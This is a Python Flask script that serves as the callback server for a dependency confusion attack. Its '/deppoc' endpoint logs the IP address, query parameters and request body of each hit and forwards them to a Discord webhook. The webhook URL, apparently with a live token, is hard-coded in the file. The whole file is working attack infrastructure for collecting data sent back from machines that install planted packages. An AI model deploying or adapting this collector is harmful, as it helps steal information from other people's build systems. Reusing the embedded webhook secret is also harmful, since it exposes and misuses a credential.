from flask import Flask, request
import logging
import requests
import json
from datetime import datetime

app = Flask(__name__)

# Discord webhook URL (replace this with your own)
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1401673458533924937/yEW2T29aV_TtEhhdZLJkkaroKSfmOTc3mlkyX0fd0n_cmGVXrxzZXe_IAxDIUKdiYI11"

# Set up logging to a file with timestamps
logging.basicConfig(
    filename='dependency_confusion_callbacks.log',
    level=logging.INFO,
    format='%(asctime)s %(message)s'
)

def send_discord_alert(ip, method, args, data):
    content = (
        f"**Dependency Confusion Callback Received**\n"
        f"**IP:** {ip}\n"
        f"**Method:** {method}\n"
        f"**Query Params:** {json.dumps(args)}\n"
        f"**Body:** {data if data else 'No Body'}"
    )
    payload = {"content": content}

    try:
        resp = requests.post(DISCORD_WEBHOOK_URL, json=payload)
        if resp.status_code != 204:
            logging.warning(f"Discord webhook returned status {resp.status_code}: {resp.text}")
    except Exception as e:
        logging.error(f"Failed to send Discord webhook: {e}")

@app.route('/deppoc', methods=['GET', 'POST'])
def deppoc():
    ip = request.remote_addr
    method = request.method
    args = request.args.to_dict()
    data = request.get_data(as_text=True)

    log_entry = f"IP: {ip} | Method: {method} | Query: {args} | Body: {data}"
    print(log_entry)
    logging.info(log_entry)

    send_discord_alert(ip, method, args, data)

    return "Logged your request!\n", 200

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8585)
